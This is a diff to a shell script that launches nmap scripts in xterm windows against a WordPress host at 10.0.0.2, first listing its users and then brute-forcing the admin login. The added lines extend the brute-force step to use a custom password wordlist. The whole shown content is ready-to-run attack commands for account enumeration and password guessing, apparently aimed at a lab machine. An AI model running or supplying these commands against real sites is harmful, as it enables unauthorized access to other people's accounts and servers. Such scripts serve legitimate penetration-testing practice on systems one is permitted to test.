@@ -15,4 +15,6 @@ echo -e "\e[93mList all wordpress users at 10.0.0.2!!!\e[0m"
 xterm -T "List all wordpress users at 10.0.0.2!!!" -hold -e nmap -p80 10.0.0.2 --script http-wordpress-users &
 echo -e "\e[92mBrute force the wordpress admin user at 10.0.0.2!!!\e[0m"
 xterm -T "Brute force the wordpress admin user at 10.0.0.2!!!" -hold -e nmap -p80 10.0.0.2 --script http-wordpress-brute --script-args userdb=user.txt &
+echo -e "(also with custom wordlists!!!)"
+xterm -T "Brute force the wordpress admin user at 10.0.0.2 with a custom wordlist!!!" -hold -e nmap -p80 10.0.0.2 --script http-wordpress-brute --script-args userdb=user.txt,passdb=password.txt &
 echo -e "\e[5mDone!!!\e[0m"
